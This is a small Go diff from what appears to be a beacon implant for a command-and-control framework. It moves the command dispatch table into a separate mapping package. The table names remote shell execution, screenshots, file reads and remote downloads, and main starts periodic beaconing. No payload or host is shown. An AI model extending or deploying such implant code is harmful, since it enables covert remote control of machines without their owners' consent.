@@ -7,6 +7,7 @@ import (
 	"runtime"
 	"time"
 
+	Mapping "./mapping"
 	Modules "./modules"
 	Networking "./networking"
 )
@@ -49,18 +50,11 @@ var beacon_timer int = 20
 var exit_process = false
 
 // Map variable functions to map, used to call function by string-based variable
-var function_mapping = map[string]func(string) string{
-	"exec_shell":      Modules.ExecShell,
-	"get_ifaces":      Modules.GetIfaces,
-	"make_screenshot": Modules.MakeScreenshot,
-	"download_remote": Modules.DownloadRemote,
-	"read_file":       Modules.ReadFile,
-}
+var function_mapping = Mapping.FunctionMapping()
 
 func main() {
 	// Generate global beacon_id and start beaconin process (same thread)
 	beacon_id = Modules.GenerateID(beacon_username)
-	// fmt.Println(base_url)
 	StartBeacon()
 }
 
